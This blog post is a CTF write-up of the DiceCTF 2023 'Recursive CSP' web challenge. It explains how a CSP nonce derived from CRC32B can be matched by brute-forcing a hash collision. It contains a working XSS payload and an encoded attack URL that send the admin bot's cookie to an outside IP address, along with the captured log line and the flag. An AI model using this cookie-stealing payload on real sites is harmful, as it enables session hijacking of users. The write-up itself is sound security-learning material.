---
layout: post
title: DiceCTF 2023 - Recursive CSP
color: rgb(51,122,183)
tags: [CTF, Web]
comments: true
share: false
excerpt_separator: <!--more-->
---

Recursive CSP was a easy web challenge from DiceCTF 2023 <!--more--> with the following description:
```
the nonce isn’t random, so how hard could this be?
(the flag is in the admin bot’s cookie)
```

### Introduction

The challenge provides two websites: the main challenge website and the admin bot, where the flag is stored. After reading the challenge description, we get the impression that we'll need to guess a nonce value in order to retrieve the flag.

### Obtain source code

After inspecting the HTML of the main website, I observed that appending the `/?source` flag to the URL allowed us to retrieve the application's source code:
```php
<?php
if (isset($_GET["source"])) highlight_file(__FILE__) && die();

$name = "world";

if (isset($_GET["name"]) && is_string($_GET["name"]) && strlen($_GET["name"]) < 128) {
    $name = $_GET["name"];
}

$nonce = hash("crc32b", $name);
header ("Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'unsafe-inline'; base-uri 'none';");

?>

<!DOCTYPE html>
<html>
    <head>
        <title>recursive-csp</titles>
    </head>
    <body>
        <h1>Hello, <?php echo $name ?>!</hl>
        <h3>Enter your name:</h3>
        <form method="GET">
            <input type="text" placeholder="name" name="name" />
            <input type="submit" />
        </form>
        <!-- /?source -->
    </body>
</html>
```
### Understanding source code

The website is setting a Content-Security-Policy that defines the following directives: 
 - **default-src 'none'**: defines that no resources are allowed to be loaded from any source by default;
 - **base-uri 'none**: disallows any base URL to be used; 
 - **script-src 'nonce-$nonce' 'unsafe-inline'**: allows scripts to be loaded only from a source that includes a specific nonce value (represented by $nonce), which is a cryptographic token that is generated each time the page is loaded.

Also the website is passing the $name parameter to a CRC32B hash function. However, CRC32B is not secure for cryptographic purposes due to its vulnerability to collision attacks, preimage attacks, and weak security properties.


```php
// The $nonce value need to be equal
$nonce = hash("crc32b", $name); #server
<script nonce='$nonce'> #frontend
```
In order to bypass the CSP Policy the $nonce value of the server must match the nonce in the script. The only limitation is that our payload must be under 128 characters long.

### Generate the payload:

Using this open source tool [CRC-32 hash collider](https://github.com/fyxme/crc-32-hash-collider){:target="_blank"} with some tweaks I made, we are able to generate the script with the desired nonce, bruteforcing the bytes to generate an crc32b hash colision.

```html
<script nonce='e6377dcb'>document.location = 'http://164.90.214.22/?cookie=' + btoa(document.cookie)</script>00000000005EPZs
```

With this script, we can bypass csp policy and execute scripts on the website.

```
https://recursive-csp.mc.ax/?name=%3Cscript%20nonce=%27e6377dcb%27%3Edocument.location%20=%20%27http://164.90.214.22/?cookie=%27%20%2b+btoa(document.cookie)%3C/script%3E00000000005EPZs
```

### Obtain the flag:

To obtain the flag, we need to send the previously generated URL to the admin bot. Once we have sent the URL, we should wait for the bot to respond with the flag. It is important to note that the flag will be returned in a Base64 encoded format, so we will need to decode it before we can read the actual flag.

```
"GET /?cookie=ZmxhZzpkaWNlQ1RGe2gwcGVfdGhhdF9kMWRudF90YWtlX3Rvb19sMG5nfQ== HTTP/1.1" 200
```

Decoding the base64 string we get the flag `diceCTF{h0pe_that_d1dnt_take_too_l0ng}`.

### Conclusion:

At first, I faced some difficulties with the generated payload as I forgot that the HTTP request automatically encodes URLs. However, once I figured that out, the CTF challenge became straightforward and fun.